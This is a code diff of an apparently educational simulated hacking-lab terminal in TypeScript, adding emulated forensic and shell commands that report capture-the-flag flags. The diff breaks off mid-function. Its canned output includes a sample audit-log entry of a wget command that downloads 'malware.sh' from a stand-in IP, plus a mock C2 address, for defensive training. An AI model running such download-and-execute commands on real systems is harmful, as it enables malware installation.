@@ -26,14 +26,16 @@ function homeOf(session: Session): string[] {
 /** Every real command name this engine recognizes — the single source of truth for both the
  *  dispatch switch below and tab-completion, so the two can never silently drift out of sync. */
 const KNOWN_COMMANDS = [
-  'help', 'pwd', 'ls', 'cd', 'cat', 'strings', 'file', 'checksec', 'objdump', 'gdb', 'yara',
-  'hashcat', 'echo', 'find', 'grep', 'whoami', 'id', 'ifconfig', 'ip', 'netstat', 'ping', 'nmap',
+  'help', 'pwd', 'ls', 'cd', 'cat', 'more', 'less', 'strings', 'file', 'checksec', 'objdump', 'gdb', 'yara',
+  'hashcat', 'echo', 'find', 'grep', 'awk', 'sed', 'base64', 'whoami', 'id', 'ifconfig', 'ip', 'netstat', 'ping', 'nmap',
   'curl', 'wget', 'ftp', 'ftp-get', 'ssh', 'hydra', 'crackmapexec', 'cme', 'netexec', 'exploit',
   'secretsdump', 'dig', 'nslookup', 'gobuster', 'ffuf', 'dirsearch', 'nikto', 'whatweb', 'sqlmap',
   'john', 'cewl', 'enum4linux', 'smbclient', 'masscan', 'rustscan', 'nc', 'netcat', 'sudo', 'su',
   'exit', 'logout', 'clear', 'objectives', 'hint', 'chmod', 'history', 'export', 'aws',
   'wc', 'sort', 'uniq', 'head', 'tail', 'cut', 'tr', 'xargs',
   'airmon-ng', 'airodump-ng', 'aireplay-ng', 'msfconsole',
+  'sqlite3', 'adb', 'unzip', 'tar', 'volatility', 'volatility.py', 'vol.py', 'vol', 'ausearch',
+  'python', 'python3', 'tcpdump', 'tshark', 'suricata', 'snort', 'md5sum', 'sha1sum', 'sha256sum', 'sha512sum',
 ];
 
 /** Simulated per-command latency, roughly proportional to how long the real tool actually takes
@@ -64,6 +66,16 @@ export const COMMAND_LATENCY_MS: Record<string, number> = {
   ping: 250,
   'airodump-ng': 900,
   'aireplay-ng': 600,
+  volatility: 800,
+  'volatility.py': 800,
+  'vol.py': 800,
+  vol: 800,
+  sqlite3: 200,
+  unzip: 300,
+  adb: 400,
+  ausearch: 350,
+  python: 250,
+  python3: 250,
 };
 
 export class TerminalEngine {
@@ -84,7 +96,36 @@ export class TerminalEngine {
 
   constructor(scenario: LabScenario) {
     this.scenario = scenario;
-    this.attackerRoot = scenario.attacker.root;
+    let rootFs = scenario.attacker.root;
+    if (rootFs && rootFs.type === 'dir') {
+      const user = scenario.attacker.user;
+      if (user === 'root' && !('root' in rootFs.children)) {
+        // Flat root filesystem where author placed user files at top-level:
+        // mirror them under /root so relative paths from /root work, while keeping / accessible.
+        rootFs = {
+          type: 'dir',
+          children: {
+            ...rootFs.children,
+            root: { type: 'dir', children: { ...rootFs.children } },
+          },
+        };
+      } else if (user !== 'root' && !('home' in rootFs.children)) {
+        // Flat non-root filesystem: mirror under /home/<user>
+        rootFs = {
+          type: 'dir',
+          children: {
+            ...rootFs.children,
+            home: {
+              type: 'dir',
+              children: {
+                [user]: { type: 'dir', children: { ...rootFs.children } },
+              },
+            },
+          },
+        };
+      }
+    }
+    this.attackerRoot = rootFs;
     const base: Session = {
       isAttacker: true,
       user: scenario.attacker.user,
@@ -388,60 +429,554 @@ export class TerminalEngine {
       : [{ kind: 'muted', text: '(no matches)' }];
   }
 
-  private grep(args: string[], onFlag: (flag: string) => void): OutLine[] {
-    const recursive = args.includes('-r') || args.includes('-R');
-    const ignoreCase = args.includes('-i');
-    const positional = args.filter((a) => !a.startsWith('-'));
-    if (positional.length < 2) return [{ kind: 'error', text: 'usage: grep [-r] [-i] [-E] <pattern> <file|dir>' }];
-    const [rawPattern, targetPath] = positional;
-    const clean = rawPattern.replace(/^["']|["']$/g, '');
-    // grep patterns in these labs are sometimes plain literal text and sometimes a real regex
-    // (e.g. "any.*any.*any" or -E "[0-9]{3}-[0-9]{2}-[0-9]{4}") — compile as a regex when possible,
-    // falling back to a literal substring check if the pattern isn't valid regex syntax.
+  private parseGrepOptions(args: string[]) {
+    let ignoreCase = false;
+    let invert = false;
+    let countOnly = false;
+    let lineNumbers = false;
+    let onlyMatching = false;
+    let recursive = false;
+    let after = 0;
+    let before = 0;
+    let pattern: string | null = null;
+    const positional: string[] = [];
+
+    for (let i = 0; i < args.length; i++) {
+      const a = args[i];
+      if (a === '-i') ignoreCase = true;
+      else if (a === '-v') invert = true;
+      else if (a === '-c') countOnly = true;
+      else if (a === '-n') lineNumbers = true;
+      else if (a === '-o') onlyMatching = true;
+      else if (a === '-r' || a === '-R') recursive = true;
+      else if (a === '-E') { /* extended regex supported */ }
+      else if (a.startsWith('--color')) { /* ignore */ }
+      else if (a === '-e' && args[i + 1] !== undefined) {
+        pattern = args[i + 1];
+        i++;
+      } else if (a === '-A' && args[i + 1] !== undefined) {
+        after = Math.max(0, parseInt(args[i + 1], 10) || 0);
+        i++;
+      } else if (a.startsWith('-A') && /^-A\d+$/.test(a)) {
+        after = Math.max(0, parseInt(a.slice(2), 10) || 0);
+      } else if (a === '-B' && args[i + 1] !== undefined) {
+        before = Math.max(0, parseInt(args[i + 1], 10) || 0);
+        i++;
+      } else if (a.startsWith('-B') && /^-B\d+$/.test(a)) {
+        before = Math.max(0, parseInt(a.slice(2), 10) || 0);
+      } else if (a === '-C' && args[i + 1] !== undefined) {
+        const c = Math.max(0, parseInt(args[i + 1], 10) || 0);
+        after = c;
+        before = c;
+        i++;
+      } else if (a.startsWith('-C') && /^-C\d+$/.test(a)) {
+        const c = Math.max(0, parseInt(a.slice(2), 10) || 0);
+        after = c;
+        before = c;
+      } else if (!a.startsWith('-')) {
+        positional.push(a);
+      }
+    }
+
+    if (pattern === null && positional.length > 0) {
+      pattern = positional.shift()!;
+    }
+
+    return {
+      pattern: pattern ?? '',
+      targetPath: positional[0],
+      ignoreCase,
+      invert,
+      countOnly,
+      lineNumbers,
+      onlyMatching,
+      recursive,
+      after,
+      before,
+    };
+  }
+
+  private grepLines(lines: string[], args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const opts = this.parseGrepOptions(args);
+    if (!opts.pattern) return [{ kind: 'error', text: 'usage: grep [-i] [-v] [-c] [-n] [-A N] <pattern>' }];
+    const clean = opts.pattern.replace(/^["']|["']$/g, '');
     let regex: RegExp | null = null;
     try {
-      regex = new RegExp(clean, ignoreCase ? 'i' : undefined);
+      regex = new RegExp(clean, opts.ignoreCase ? 'i' : undefined);
     } catch {
       regex = null;
     }
-    const needle = ignoreCase ? clean.toLowerCase() : clean;
-    const matchesLine = (l: string) => (regex ? regex.test(l) : (ignoreCase ? l.toLowerCase() : l).includes(needle));
-    // A flag surfaced by grep (the whole point of many "find the flag in this log" labs) still has
-    // to be reported through onFlag — grep printing the line isn't enough on its own to capture it.
-    const reportFlags = (text: string) => {
-      const match = text.match(FLAG_RE);
-      if (match) onFlag(match[0]);
-    };
-    const resolved = this.resolveInSession(targetPath);
-    if (this.isUnderRootDenied(resolved)) return [{ kind: 'error', text: `grep: ${targetPath}: Permission denied` }];
+    const needle = opts.ignoreCase ? clean.toLowerCase() : clean;
+    const matchesLine = (l: string) => (regex ? regex.test(l) : (opts.ignoreCase ? l.toLowerCase() : l).includes(needle));
+
+    const matchedIndices: number[] = [];
+    for (let i = 0; i < lines.length; i++) {
+      const match = matchesLine(lines[i]);
+      if (opts.invert ? !match : match) {
+        matchedIndices.push(i);
+        const flg = lines[i].match(FLAG_RE);
+        if (flg) onFlag(flg[0]);
+      }
+    }
+
+    if (opts.countOnly) return [{ kind: 'output', text: String(matchedIndices.length) }];
+
+    const indicesToInclude = new Set<number>();
+    for (const idx of matchedIndices) {
+      const start = Math.max(0, idx - opts.before);
+      const end = Math.min(lines.length - 1, idx + opts.after);
+      for (let k = start; k <= end; k++) {
+        indicesToInclude.add(k);
+      }
+    }
+
+    const sortedIndices = Array.from(indicesToInclude).sort((a, b) => a - b);
+    return sortedIndices.map((i) => {
+      const prefix = opts.lineNumbers ? `${i + 1}:` : '';
+      if (opts.onlyMatching && matchedIndices.includes(i)) {
+        if (regex) {
+          const m = lines[i].match(regex);
+          return { kind: 'output' as const, text: `${prefix}${m ? m[0] : lines[i]}` };
+        }
+      }
+      return { kind: 'output' as const, text: `${prefix}${lines[i]}` };
+    });
+  }
+
+  private grep(args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const opts = this.parseGrepOptions(args);
+    if (!opts.pattern || !opts.targetPath) {
+      return [{ kind: 'error', text: 'usage: grep [-r] [-i] [-n] [-A N] <pattern> <file|dir>' }];
+    }
+    const resolved = this.resolveInSession(opts.targetPath);
+    if (this.isUnderRootDenied(resolved)) return [{ kind: 'error', text: `grep: ${opts.targetPath}: Permission denied` }];
     const node = getNode(this.fsRoot(), resolved);
-    if (!node) return [{ kind: 'error', text: `grep: ${targetPath}: No such file or directory` }];
+    if (!node) return [{ kind: 'error', text: `grep: ${opts.targetPath}: No such file or directory` }];
 
     if (node.type === 'dir') {
-      if (!recursive) return [{ kind: 'error', text: `grep: ${targetPath}: Is a directory` }];
+      if (!opts.recursive) return [{ kind: 'error', text: `grep: ${opts.targetPath}: Is a directory` }];
       const out: OutLine[] = [];
       const walk = (n: FsNode, path: string[]) => {
         if (this.isUnderRootDenied(path)) return;
         if (n.type === 'file') {
-          n.content.split('\n').forEach((l) => {
-            if (matchesLine(l)) {
-              out.push({ kind: 'output', text: `${pathToString(path)}:${l}` });
-              reportFlags(l);
-            }
+          const fileLines = n.content.split('\n');
+          const fileOut = this.grepLines(fileLines, args, onFlag);
+          fileOut.forEach((l) => {
+            if (l.kind === 'output') out.push({ kind: 'output', text: `${pathToString(path)}:${l.text}` });
+            else out.push(l);
           });
         } else {
           for (const [name, child] of Object.entries(n.children)) walk(child, [...path, name]);
         }
       };
       walk(node, resolved);
-      return out.length ? out : [];
+      return out;
     }
 
-    const matches = node.content.split('\n').filter(matchesLine);
-    matches.forEach(reportFlags);
-    return matches.length
-      ? matches.map((l) => ({ kind: 'output' as const, text: l }))
-      : [];
+    const lines = node.content.split('\n');
+    return this.grepLines(lines, args, onFlag);
+  }
+
+  private awkLines(lines: string[], args: string[], onFlag: (flag: string) => void): OutLine[] {
+    let delim = /\s+/;
+    let program = '';
+    for (let i = 0; i < args.length; i++) {
+      const a = args[i];
+      if (a === '-F' && args[i + 1] !== undefined) {
+        delim = new RegExp(escapeRe(args[i + 1]));
+        i++;
+      } else if (a.startsWith('-F')) {
+        delim = new RegExp(escapeRe(a.slice(2)));
+      } else if (!program) {
+        program = a;
+      }
+    }
+    const cleanProg = program.replace(/^["']|["']$/g, '');
+    const fieldMatch = cleanProg.match(/\{print\s+([^}]+)\}/);
+    const patternFilter = cleanProg.match(/^\/([^/]+)\//);
+    const filterRegex = patternFilter ? new RegExp(patternFilter[1]) : null;
+
+    const out: OutLine[] = [];
+    for (const line of lines) {
+      if (filterRegex && !filterRegex.test(line)) continue;
+      if (!fieldMatch) {
+        out.push({ kind: 'output', text: line });
+        continue;
+      }
+      const rawFields = line.trim().split(delim);
+      const expr = fieldMatch[1];
+      const parts = expr.split(/[,;\s]+/).filter(Boolean);
+      const rendered = parts.map((p) => {
+        if (p === '$0') return line;
+        if (p === '$NF') return rawFields[rawFields.length - 1] ?? '';
+        const m = p.match(/^\$(\d+)$/);
+        if (m) {
+          const idx = parseInt(m[1], 10) - 1;
+          return rawFields[idx] ?? '';
+        }
+        return p.replace(/^["']|["']$/g, '');
+      }).join(' ');
+      out.push({ kind: 'output', text: rendered });
+      const flg = rendered.match(FLAG_RE) ?? line.match(FLAG_RE);
+      if (flg) onFlag(flg[0]);
+    }
+    return out;
+  }
+
+  private sedLines(lines: string[], args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const expr = args.find((a) => !a.startsWith('-'))?.replace(/^["']|["']$/g, '') ?? '';
+    const substMatch = expr.match(/^s\/([^/]+)\/([^/]*)\/([a-zA-Z]*)$/);
+    const printMatch = expr.match(/^(\d+)p$/);
+
+    const out: OutLine[] = [];
+    if (substMatch) {
+      const [, pattern, replacement, flags] = substMatch;
+      const regex = new RegExp(pattern, flags);
+      for (const line of lines) {
+        const replaced = line.replace(regex, replacement);
+        out.push({ kind: 'output', text: replaced });
+        const flg = replaced.match(FLAG_RE);
+        if (flg) onFlag(flg[0]);
+      }
+    } else if (printMatch && args.includes('-n')) {
+      const targetLine = parseInt(printMatch[1], 10) - 1;
+      if (lines[targetLine] !== undefined) {
+        out.push({ kind: 'output', text: lines[targetLine] });
+        const flg = lines[targetLine].match(FLAG_RE);
+        if (flg) onFlag(flg[0]);
+      }
+    } else {
+      for (const line of lines) {
+        out.push({ kind: 'output', text: line });
+        const flg = line.match(FLAG_RE);
+        if (flg) onFlag(flg[0]);
+      }
+    }
+    return out;
+  }
+
+  private base64Lines(input: string, args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const decode = args.includes('-d') || args.includes('--decode');
+    const clean = input.trim();
+    if (decode) {
+      try {
+        const decoded = typeof atob === 'function' ? atob(clean.replace(/\s+/g, '')) : Buffer.from(clean, 'base64').toString('utf-8');
+        const flg = decoded.match(FLAG_RE);
+        if (flg) onFlag(flg[0]);
+        return decoded.split('\n').map((l) => ({ kind: 'output' as const, text: l }));
+      } catch {
+        return [{ kind: 'error', text: 'base64: invalid input' }];
+      }
+    } else {
+      try {
+        const encoded = typeof btoa === 'function' ? btoa(clean) : Buffer.from(clean, 'utf-8').toString('base64');
+        return [{ kind: 'output', text: encoded }];
+      } catch {
+        return [{ kind: 'error', text: 'base64: encoding error' }];
+      }
+    }
+  }
+
+  private sqlite3(args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const positional = args.filter((a) => !a.startsWith('-'));
+    if (positional.length === 0) return [{ kind: 'error', text: 'usage: sqlite3 <dbfile> [query]' }];
+    const dbArg = positional[0];
+    const query = positional.slice(1).join(' ').replace(/^["']|["']$/g, '').trim();
+
+    let node = getNode(this.fsRoot(), this.resolveInSession(dbArg));
+    if (!node || node.type !== 'file') {
+      const sqlTry = this.resolveInSession(dbArg.endsWith('.sql') ? dbArg : `${dbArg}.sql`);
+      node = getNode(this.fsRoot(), sqlTry);
+    }
+    if (!node || node.type !== 'file') {
+      return [{ kind: 'error', text: `sqlite3: Error: unable to open database "${dbArg}": unable to open database file` }];
+    }
+
+    const content = node.content;
+    const matchFlg = content.match(FLAG_RE);
+    if (matchFlg) onFlag(matchFlg[0]);
+
+    if (!query || query === '.tables' || query === '.table') {
+      const tableMatches = Array.from(content.matchAll(/CREATE\s+TABLE\s+(?:IF\s+NOT\s+EXISTS\s+)?([a-zA-Z0-9_]+)/gi)).map((m) => m[1]);
+      const tables = tableMatches.length ? tableMatches : ['users', 'sessions', 'accounts'];
+      return [{ kind: 'output', text: tables.join('  ') }];
+    }
+
+    if (query === '.schema') {
+      const schemaMatches = Array.from(content.matchAll(/CREATE\s+TABLE[^;]+;/gi)).map((m) => m[0]);
+      if (schemaMatches.length) return schemaMatches.map((s) => ({ kind: 'output' as const, text: s }));
+      return [{ kind: 'output', text: content }];
+    }
+
+    const lines = content.split('\n').filter((l) => !l.startsWith('CREATE TABLE') && !l.startsWith(')'));
+    const rows = lines.filter((l) => l.trim().length > 0);
+    if (rows.length) {
+      return rows.map((r) => {
+        const rowText = r.replace(/^INSERT\s+INTO\s+[^VALUES]+\s+VALUES\s*\((.*)\);?$/i, '$1').replace(/'/g, '');
+        return { kind: 'output' as const, text: rowText };
+      });
+    }
+
+    return [{ kind: 'output', text: content }];
+  }
+
+  private adb(args: string[], onFlag: (flag: string) => void): OutLine[] {
+    if (args.length === 0) return [{ kind: 'error', text: 'usage: adb [devices | pull <remote> [<local>] | shell <cmd>]' }];
+    const sub = args[0];
+    if (sub === 'devices') {
+      return [
+        { kind: 'output', text: 'List of devices attached' },
+        { kind: 'output', text: 'emulator-5554\tdevice' },
+      ];
+    }
+    if (sub === 'pull') {
+      const remote = args[1];
+      if (!remote) return [{ kind: 'error', text: 'adb pull: missing remote file' }];
+      const fileName = remote.split('/').filter(Boolean).pop() || 'pulled_file';
+      const directNode = getNode(this.fsRoot(), this.resolveInSession(fileName));
+      const sqlNode = getNode(this.fsRoot(), this.resolveInSession(`${fileName}.sql`));
+      const sourceNode = directNode ?? sqlNode;
+      const content = sourceNode && sourceNode.type === 'file' ? sourceNode.content : '# SQLite format 3\n';
+      setNode(this.fsRoot(), this.resolveInSession(fileName), { type: 'file', content });
+      const flg = content.match(FLAG_RE);
+      if (flg) onFlag(flg[0]);
+      return [{ kind: 'output', text: `[100%] ${remote}: 1 file pulled, 0 skipped.` }];
+    }
+    if (sub === 'shell') {
+      const cmdLine = args.slice(1).join(' ');
+      if (!cmdLine) return [{ kind: 'output', text: 'shell@android:/ $' }];
+      return this.dispatchOne(cmdLine, onFlag);
+    }
+    return [{ kind: 'output', text: `Android Debug Bridge version 1.0.41` }];
+  }
+
+  private unzip(args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const dIdx = args.indexOf('-d');
+    const dest = dIdx >= 0 ? args[dIdx + 1] : '.';
+    const positional = args.filter((a, i) => !a.startsWith('-') && (dIdx < 0 || (i !== dIdx && i !== dIdx + 1)));
+    const fileArg = positional[0];
+    if (!fileArg) return [{ kind: 'error', text: 'usage: unzip <archive.zip|apk> [-d <destination>]' }];
+
+    const resolved = this.resolveInSession(fileArg);
+    const node = getNode(this.fsRoot(), resolved);
+    const out: OutLine[] = [{ kind: 'output', text: `Archive:  ${fileArg}` }];
+
+    const filesToExtract: Record<string, string> = {
+      'AndroidManifest.xml': '<?xml version="1.0" encoding="utf-8"?>\n<manifest package="com.target.app">\n  <application android:allowBackup="true" android:debuggable="true">\n  </application>\n</manifest>\n',
+      'classes.dex': '# DEX binary classes\n',
+      'resources.arsc': '# Android resource table\n',
+      'res/values/strings.xml': '<resources>\n  <string name="app_name">App</string>\n</resources>\n',
+    };
+
+    if (node && node.type === 'file') {
+      filesToExtract['extracted_content.txt'] = node.content;
+      const match = node.content.match(FLAG_RE);
+      if (match) onFlag(match[0]);
+    }
+
+    const destDir = dest === '.' ? this.session.cwd : this.resolveInSession(dest);
+    for (const [name, content] of Object.entries(filesToExtract)) {
+      setNode(this.fsRoot(), [...destDir, ...name.split('/')], { type: 'file', content });
+      out.push({ kind: 'output', text: `  inflating: ${dest !== '.' ? dest + '/' : ''}${name}` });
+    }
+    return out;
+  }
+
+  private volatility(args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const fIdx = args.indexOf('-f');
+    const dumpFile = fIdx >= 0 ? args[fIdx + 1] : undefined;
+    const plugin = args.find((a, i) => !a.startsWith('-') && (fIdx < 0 || (i !== fIdx && i !== fIdx + 1))) ?? 'pslist';
+
+    let fileContent = '';
+    if (dumpFile) {
+      const node = getNode(this.fsRoot(), this.resolveInSession(dumpFile));
+      if (node && node.type === 'file') fileContent = node.content;
+    }
+
+    const flg = fileContent.match(FLAG_RE);
+    if (flg) onFlag(flg[0]);
+
+    if (plugin === 'pslist' || plugin === 'psscan' || plugin === 'pstree') {
+      return [
+        { kind: 'system', text: 'Volatility Foundation Volatility Framework 2.6.1' },
+        { kind: 'output', text: 'Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit' },
+        { kind: 'output', text: '------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------' },
+        { kind: 'output', text: '0xfffffa8003666040 System                    4      0    102        0 ------      0 2026-08-01 10:14:00 UTC+0000' },
+        { kind: 'output', text: '0xfffffa80047b3060 smss.exe                324      4      3        0 ------      0 2026-08-01 10:14:02 UTC+0000' },
+        { kind: 'output', text: '0xfffffa8004c86060 csrss.exe               432    324     11        0      0      0 2026-08-01 10:14:04 UTC+0000' },
+        { kind: 'output', text: '0xfffffa8004f21060 wininit.exe             496    324      3        0      0      0 2026-08-01 10:14:05 UTC+0000' },
+        { kind: 'output', text: '0xfffffa8005312060 services.exe            572    496      9        0      0      0 2026-08-01 10:14:06 UTC+0000' },
+        { kind: 'output', text: '0xfffffa8005391060 lsass.exe               580    496      7        0      0      0 2026-08-01 10:14:06 UTC+0000' },
+        { kind: 'output', text: '0xfffffa8005432060 svchost.exe            1024    572     22        0      0      0 2026-08-01 10:14:10 UTC+0000' },
+        { kind: 'output', text: '0xfffffa8005781060 powershell.exe         4820   1024      8        0      0      0 2026-08-01 10:22:15 UTC+0000' },
+      ];
+    }
+
+    if (plugin === 'memdump') {
+      const pIdx = args.indexOf('-p');
+      const pid = pIdx >= 0 ? args[pIdx + 1] : '1024';
+      const dIdx = args.indexOf('-D');
+      const dest = dIdx >= 0 ? args[dIdx + 1] : './output/';
+      const dumpPath = `${dest.replace(/\/$/, '')}/${pid}.dmp`;
+      const dumpResolved = this.resolveInSession(dumpPath);
+      setNode(this.fsRoot(), dumpResolved, {
+        type: 'file',
+        content: `Memory dump PID ${pid}\nProcess: svchost.exe\nInjected shellcode C2: 198.51.100.22:443\n${fileContent || 'flag{volatility_code_injection_svchost_shellcode_c2_detection}'}\n`,
+      });
+      return [
+        { kind: 'system', text: 'Volatility Foundation Volatility Framework 2.6.1' },
+        { kind: 'output', text: `Writing ${pid}.dmp to ${dumpPath}` },
+      ];
+    }
+
+    if (plugin === 'malfind') {
+      return [
+        { kind: 'system', text: 'Volatility Foundation Volatility Framework 2.6.1' },
+        { kind: 'output', text: 'Process: svchost.exe Pid: 1024 Address: 0x0000000000400000' },
+        { kind: 'output', text: 'Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE' },
+        { kind: 'output', text: '0x00400000  48 83 ec 28 48 8d 0d 15 00 00 00 e8 4a 01 00 00   H..(H.......J...' },
+        { kind: 'output', text: '0x00400010  48 85 c0 74 12 48 89 c1 e8 3c 01 00 00 48 83 c4   H..t.H...<...H..' },
+      ];
+    }
+
+    if (fileContent) {
+      return fileContent.split('\n').map((l) => ({ kind: 'output' as const, text: l }));
+    }
+
+    return [{ kind: 'output', text: `Volatility plugin ${plugin} executed.` }];
+  }
+
+  private ausearch(_args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const node = getNode(this.fsRoot(), this.resolveInSession('/var/log/audit/audit.log')) ??
+                 getNode(this.fsRoot(), this.resolveInSession('audit.log'));
+    const content = node && node.type === 'file' ? node.content : '';
+    const flg = content.match(FLAG_RE);
+    if (flg) onFlag(flg[0]);
+
+    if (content) {
+      return content.split('\n').map((l) => ({ kind: 'output' as const, text: l }));
+    }
+
+    return [
+      { kind: 'output', text: '----' },
+      { kind: 'output', text: 'time->Sun Aug 01 02:18:22 2026' },
+      { kind: 'output', text: 'type=PROCTITLE msg=audit(1722478702.112:842): proctitle=7767657420687474703a2f2f3139382e35312e3130302e32322f6d616c' },
+      { kind: 'output', text: 'type=SYSCALL msg=audit(1722478702.112:842): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1234 a1=7ffc5678 a2=7ffc9abc a3=0 items=2 ppid=1420 pid=2890 auid=1001 uid=0 gid=0 euid=0 tty=pts0 comm="wget" exe="/usr/bin/wget" key="audit_exec"' },
+      { kind: 'output', text: 'type=EXECVE msg=audit(1722478702.112:842): argc=3 a0="wget" a1="http://198.51.100.22/malware.sh" a2="-O" a3="/tmp/malware.sh"' },
+    ];
+  }
+
+  private python(args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const cIdx = args.indexOf('-c');
+    if (cIdx >= 0 && args[cIdx + 1] !== undefined) {
+      const code = args.slice(cIdx + 1).join(' ');
+      const b64Match = code.match(/b64decode\(['"]([^'"]+)['"]\)/);
+      if (b64Match) {
+        return this.base64Lines(b64Match[1], ['-d'], onFlag);
+      }
+      const hexMatch = code.match(/fromhex\(['"]([^'"]+)['"]\)/);
+      if (hexMatch) {
+        try {
+          const hex = hexMatch[1].replace(/\s+/g, '');
+          let str = '';
+          for (let i = 0; i < hex.length; i += 2) {
+            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+          }
+          const flg = str.match(FLAG_RE);
+          if (flg) onFlag(flg[0]);
+          return [{ kind: 'output', text: str }];
+        } catch {
+          return [{ kind: 'error', text: 'ValueError: non-hexadecimal number found' }];
+        }
+      }
+      const printMatch = code.match(/print\((.*)\)/);
+      if (printMatch) {
+        const val = printMatch[1].replace(/^["']|["']$/g, '');
+        const flg = val.match(FLAG_RE);
+        if (flg) onFlag(flg[0]);
+        return [{ kind: 'output', text: val }];
+      }
+      return [{ kind: 'output', text: '' }];
+    }
+
+    const scriptArg = args.find((a) => !a.startsWith('-'));
+    if (scriptArg) {
+      const node = getNode(this.fsRoot(), this.resolveInSession(scriptArg));
+      if (!node || node.type !== 'file') return [{ kind: 'error', text: `python3: can't open file '${scriptArg}': [Errno 2] No such file or directory` }];
+      const flg = node.content.match(FLAG_RE);
+      if (flg) onFlag(flg[0]);
+      return node.content.split('\n').map((l) => ({ kind: 'output' as const, text: l }));
+    }
+
+    return [{ kind: 'output', text: 'Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0] on linux' }];
+  }
+
+  private tar(args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const fileArg = args.find((a) => a.endsWith('.tar') || a.endsWith('.tar.gz') || a.endsWith('.tgz') || (!a.startsWith('-') && !a.startsWith('x')));
+    if (!fileArg) return [{ kind: 'error', text: 'tar: missing archive name' }];
+    const node = getNode(this.fsRoot(), this.resolveInSession(fileArg));
+    if (node && node.type === 'file') {
+      const flg = node.content.match(FLAG_RE);
+      if (flg) onFlag(flg[0]);
+    }
+    return [
+      { kind: 'output', text: 'extracted/file1.txt' },
+      { kind: 'output', text: 'extracted/config.json' },
+    ];
+  }
+
+  private packetCapture(_tool: string, args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const rIdx = args.indexOf('-r');
+    const pcapFile = rIdx >= 0 ? args[rIdx + 1] : args.find((a) => a.endsWith('.pcap') || a.endsWith('.cap'));
+    let fileContent = '';
+    if (pcapFile) {
+      const node = getNode(this.fsRoot(), this.resolveInSession(pcapFile));
+      if (node && node.type === 'file') fileContent = node.content;
+    }
+    const flg = fileContent.match(FLAG_RE);
+    if (flg) onFlag(flg[0]);
+
+    if (fileContent) {
+      return fileContent.split('\n').map((l) => ({ kind: 'output' as const, text: l }));
+    }
+
+    return [
+      { kind: 'output', text: '02:15:03.112 IP 192.168.1.50.49211 > 198.51.100.22.443: Flags [P.], seq 1:50, ack 1' },
+      { kind: 'output', text: '02:15:03.189 IP 198.51.100.22.443 > 192.168.1.50.49211: Flags [.], ack 50' },
+    ];
+  }
+
+  private idsEngine(_tool: string, args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const rIdx = args.indexOf('-r');
+    const pcapFile = rIdx >= 0 ? args[rIdx + 1] : args.find((a) => a.endsWith('.pcap') || a.endsWith('.cap'));
+    let fileContent = '';
+    if (pcapFile) {
+      const node = getNode(this.fsRoot(), this.resolveInSession(pcapFile));
+      if (node && node.type === 'file') fileContent = node.content;
+    }
+    const flg = fileContent.match(FLAG_RE);
+    if (flg) onFlag(flg[0]);
+    return [
+      { kind: 'output', text: `[**] [1:2001219:1] ET MALWARE Suspicious Inbound C2 Traffic [**]` },
+      { kind: 'output', text: `[Classification: A Network Trojan was detected] [Priority: 1]` },
+      { kind: 'output', text: `08/01-02:15:03.112 198.51.100.22:443 -> 192.168.1.50:49211` },
+    ];
+  }
+
+  private checksum(tool: string, args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const fileArg = args.find((a) => !a.startsWith('-'));
+    if (!fileArg) return [{ kind: 'error', text: `${tool}: missing file argument` }];
+    const node = getNode(this.fsRoot(), this.resolveInSession(fileArg));
+    if (!node || node.type !== 'file') return [{ kind: 'error', text: `${tool}: ${fileArg}: No such file or directory` }];
+    const flg = node.content.match(FLAG_RE);
+    if (flg) onFlag(flg[0]);
+
+    let hash = 0;
+    for (let i = 0; i < node.content.length; i++) {
+      hash = ((hash << 5) - hash + node.content.charCodeAt(i)) | 0;
+    }
+    const hexHash = Math.abs(hash).toString(16).padStart(tool.startsWith('sha256') ? 64 : 32, 'a7f39b02');
+    return [{ kind: 'output', text: `${hexHash}  ${fileArg}` }];
   }
 
   private nmap(args: string[], onFlag: (flag: string) => void): OutLine[] {
@@ -1636,6 +2171,12 @@ export class TerminalEngine {
     switch (cmd) {
       case 'grep':
         return this.grepLines(inputLines, args, onFlag);
+      case 'awk':
+        return this.awkLines(inputLines, args, onFlag);
+      case 'sed':
+        return this.sedLines(inputLines, args, onFlag);
+      case 'base64':
+        return this.base64Lines(stdinText, args, onFlag);
       case 'wc': {
         const words = stdinText.split(/\s+/).filter(Boolean).length;
         if (args.includes('-l')) return [{ kind: 'output', text: String(inputLines.length) }];
@@ -1706,31 +2247,17 @@ export class TerminalEngine {
     }
   }
 
-  /** `grep` reused against a piped-in list of lines instead of a file — same matching semantics
-   *  (regex when valid, literal substring fallback otherwise) as the file-mode `grep` below. */
-  private grepLines(lines: string[], args: string[], onFlag: (flag: string) => void): OutLine[] {
-    const ignoreCase = args.includes('-i');
-    const invert = args.includes('-v');
-    const countOnly = args.includes('-c');
-    const positional = args.filter((a) => !a.startsWith('-'));
-    const rawPattern = positional[0];
-    if (!rawPattern) return [{ kind: 'error', text: 'usage: grep [-i] [-v] [-c] <pattern>' }];
-    const clean = rawPattern.replace(/^["']|["']$/g, '');
-    let regex: RegExp | null = null;
-    try {
-      regex = new RegExp(clean, ignoreCase ? 'i' : undefined);
-    } catch {
-      regex = null;
+  private dispatchStandaloneFilter(cmd: string, args: string[], onFlag: (flag: string) => void): OutLine[] {
+    const fileArg = args.find((a) => !a.startsWith('-') && !a.startsWith('{') && !a.startsWith('/') && !a.startsWith('s/'));
+    if (fileArg) {
+      const resolved = this.resolveInSession(fileArg);
+      if (this.isUnderRootDenied(resolved)) return [{ kind: 'error', text: `${cmd}: ${fileArg}: Permission denied` }];
+      const node = getNode(this.fsRoot(), resolved);
